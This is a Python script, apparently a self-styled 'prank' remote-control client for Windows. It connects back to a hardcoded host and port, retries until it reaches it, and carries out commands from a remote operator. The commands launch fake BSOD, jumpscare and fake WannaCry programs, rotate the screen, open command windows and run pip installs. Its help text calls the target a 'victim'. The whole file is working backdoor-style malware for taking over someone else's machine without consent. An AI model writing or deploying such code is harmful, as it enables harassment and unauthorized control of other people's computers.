from msilib.schema import Class
import os
import socket
import time
import rotatescreen as rs
import sys
import zipfile



class Vir:
    def __init__(self,path,start_file):
        self.path = path
        self.start_file = start_file
    def start(self):
        import subprocess

        os.system(f'cmd /c "cd {self.path} & {self.start_file}"')
        os.system(f'cmd /c "pip install rotate-screen"')
        
class Pyrus(Vir):
    def __init__(self):
        Vir.__init__(self,"pranks.a/PYrus-master","startn")
        os.system(f'cmd /c "pip install pyautogui"')
class JumpiJum(Vir):
    def __init__(self):
        Vir.__init__(self,"pranks.a/prankster-main","os")
class WannaDog(Vir):
    def __init__(self):
        Vir.__init__(self,"opfer/pranks.a/wana.doge-main","wd")#pip installieren PyQt5
        os.system(f'cmd /c "pip install PyQt5"')
if __name__ == '__main__':
    Pyr = Pyrus()
    WD = WannaDog()
    JJ = JumpiJum()
    HOST_Ip = "192.168.178.31"
    port = 3332
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    while True:
     while True:
        try:
           
           s.connect((HOST_Ip,port))
           print("Connected")
           break
        except:
            print("Conn_Faild")
            time.sleep(30)
            continue
     while True:
        viru = s.recv(2024)
        viru = viru.decode()
        vire = viru.split(" ")
        print(viru)
        if viru == "execute(pyrus)":
            Pyr.start()
        elif viru == "execute(JumpiJump)":
            JJ.start()
        elif viru == "execute(WannaDog)":
            WD.start()
        elif viru == "q":
            break
        elif vire[0] == "flip":
            screen = rs.get_primary_display()
            try:
             screen.rotate_to(int(vire[1])) # rotate to 90 degrees
             
            except:
                pass
        elif viru == "help":
            s.send(" execute(syntax: 'execute(arg)'):\npyrus(Fake BSOD)\nJumpiJump(JumpScare)\nWannaDog(Wannacry Fake(Harmles))\n Other(syntax:arg):\nhelp(print help)\nrelase(opfer freilassen)\nquit()(editor verlassen)".encode())
            
        elif viru == "relase":
            sys.exit('realesed')
        

        else:
            os.system(f'cmd /c "start cmd.exe"')
            
    
